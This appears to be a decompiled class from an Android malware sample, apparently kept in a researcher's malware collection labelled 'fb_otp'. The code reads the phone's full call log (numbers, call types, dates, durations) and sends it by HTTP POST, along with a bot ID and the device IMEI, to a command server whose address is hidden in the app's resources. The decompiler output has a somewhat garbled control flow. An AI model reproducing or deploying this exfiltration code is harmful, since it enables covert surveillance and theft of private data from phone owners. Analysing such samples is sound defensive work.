import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog.Calls;
import com.soft360.iService.AService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class dW
  implements Runnable
{
  dW(dU paramdU) {}
  
  public final void run()
  {
    Object localObject3 = AService.jdField_a_of_type_AndroidContentContext.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
    int i = ((Cursor)localObject3).getColumnIndex("number");
    int j = ((Cursor)localObject3).getColumnIndex("type");
    int k = ((Cursor)localObject3).getColumnIndex("date");
    int m = ((Cursor)localObject3).getColumnIndex("duration");
    Object localObject2 = "";
    Object localObject1;
    if (!((Cursor)localObject3).moveToNext())
    {
      localObject1 = new DefaultHttpClient();
      ((HttpClient)localObject1).getParams().setParameter("http.protocol.content-charset", "UTF-8");
      new el();
      localObject3 = this.a.a(AService.jdField_a_of_type_AndroidContentContext.getString(2131165194));
      localObject3 = new HttpPost(this.a.a(AService.jdField_a_of_type_Int) + (String)localObject3);
    }
    try
    {
      localObject4 = new ArrayList();
      ((List)localObject4).add(new BasicNameValuePair("call_list", (String)localObject2));
      ((List)localObject4).add(new BasicNameValuePair("bot_id", this.a.b()));
      localObject2 = this.a;
      ((List)localObject4).add(new BasicNameValuePair("imei", dU.a()));
      ((HttpPost)localObject3).setEntity(new UrlEncodedFormEntity((List)localObject4, "UTF-8"));
      ((HttpClient)localObject1).execute((HttpUriRequest)localObject3);
      return;
    }
    catch (IOException localIOException)
    {
      Object localObject4;
      String str1;
      String str2;
      Date localDate;
      String str3;
      localIOException.printStackTrace();
      return;
    }
    catch (ClientProtocolException localClientProtocolException) {}
    localObject4 = ((Cursor)localObject3).getString(i);
    str1 = ((Cursor)localObject3).getString(j);
    str2 = ((Cursor)localObject3).getString(k);
    localDate = new Date(Long.valueOf(str2).longValue());
    str3 = ((Cursor)localObject3).getString(m);
    switch (Integer.parseInt(str1))
    {
    default: 
      localObject1 = null;
    }
    for (;;)
    {
      localObject2 = localObject2 + (String)localObject4 + "|||" + str1 + "|||" + str2 + "|||" + localDate + "|||" + str3 + "|||" + (String)localObject1 + "\n";
      break;
      localObject1 = "OUTGOING";
      continue;
      localObject1 = "INCOMING";
      continue;
      localObject1 = "MISSED";
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dW.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */